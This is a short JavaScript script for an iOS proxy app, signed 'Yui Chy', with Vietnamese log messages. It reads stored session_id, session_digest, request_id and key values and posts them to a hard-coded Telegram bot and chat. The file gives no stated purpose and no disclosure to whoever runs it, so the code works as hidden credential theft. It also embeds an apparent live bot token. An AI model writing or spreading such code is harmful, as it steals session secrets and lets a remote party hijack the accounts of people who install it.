/*
Script Author: Yui Chy
Source: Custom
*/

const token = "1759212113:AAEQVd73Ym_dJtgBqQHCQ0ihD9mvhfb59DU";
const chatId = "-1001797215512";

const session_id = $prefs.valueForKey("session_id");
const session_digest = $prefs.valueForKey("session_digest");
const request_id = $prefs.valueForKey("request_id");
const key = $prefs.valueForKey("key");

if (session_id && session_digest && request_id && key) {
  const data = {
    session_id: session_id,
    session_digest: session_digest,
    request_id: request_id,
    key: key
  };

  sendToTelegram(data);
} else {
  console.log("Thiếu thông tin cần thiết để gửi lên Telegram.");
}

function sendToTelegram(data) {
  const message = `session_id: ${data.session_id}, session_digest: ${data.session_digest}, request_id: ${data.request_id}, key: ${data.key}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  };

  $task.fetch({
    url: url,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  }).then(response => {
    if (response.statusCode === 200) {
      console.log("Thông tin đã được gửi lên Telegram thành công.");
    } else {
      console.log(`Có lỗi xảy ra khi gửi thông tin lên Telegram. Mã lỗi: ${response.statusCode}, Nội dung: ${response.body}`);
    }
  }).catch(error => {
    console.log("Có lỗi xảy ra khi gửi thông tin lên Telegram:", error);
  });
}
